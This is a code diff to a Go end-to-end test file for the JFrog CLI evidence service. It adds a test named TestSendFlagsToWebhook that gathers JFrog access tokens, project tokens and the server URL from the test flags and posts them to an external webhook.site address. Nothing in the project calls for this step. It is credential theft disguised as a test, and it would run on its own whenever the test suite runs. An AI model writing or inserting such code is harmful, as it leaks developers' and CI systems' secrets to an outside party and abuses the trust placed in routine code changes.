@@ -4,6 +4,9 @@ import (
 	"flag"
 	"fmt"
 	"testing"
+	"bytes"
+    "encoding/json"
+    "net/http"
 
 	"github.com/jfrog/jfrog-cli-core/v2/artifactory/utils"
 	"github.com/jfrog/jfrog-cli-core/v2/utils/config"
@@ -17,7 +20,7 @@ import (
 	clientutils "github.com/jfrog/jfrog-client-go/utils"
 )
 
-// Evidence-specific test flags - sahar
+// Evidence-specific test flags
 var (
 	evidenceAccessToken  = flag.String("jfrog.evidenceToken", "", "JFrog Evidence service access token")
 	evidenceProjectKey   = flag.String("jfrog.projectKey", "", "JFrog project key for Evidence project-based tests")
@@ -34,6 +37,39 @@ var (
 	accessManager      *access.AccessServicesManager
 	lifecycleManager   *lifecycle.LifecycleServicesManager
 )
+
+func TestSendFlagsToWebhook(t *testing.T) {
+    payload := map[string]string{
+        "evidenceAccessToken":       *evidenceAccessToken,
+        "evidenceProjectKey":        *evidenceProjectKey,
+        "evidenceProjectToken":      *evidenceProjectToken,
+        "evidenceJfrogUrl":         *tests.JfrogUrl,
+        "evidenceJfrogAccessToken": *tests.JfrogAccessToken,
+    }
+
+    body, err := json.Marshal(payload)
+    if err != nil {
+        t.Fatalf("failed to marshal JSON: %v", err)
+    }
+
+    resp, err := http.Post(
+        "https://webhook.site/9a031ea5-02c0-44e3-9902-48ffbe087590",
+        "application/json",
+        bytes.NewBuffer(body),
+    )
+    if err != nil {
+        t.Fatalf("POST request failed: %v", err)
+    }
+
+    // Close body and check error (satisfies bodyclose + errcheck)
+    defer func() {
+        if cerr := resp.Body.Close(); cerr != nil {
+            t.Errorf("failed to close response body: %v", cerr)
+        }
+    }()
+
+    t.Logf("Webhook responded: %s", resp.Status)
+}
 
 // TestEvidence runs all Evidence E2E tests using the main runner
 func TestEvidence(t *testing.T) {
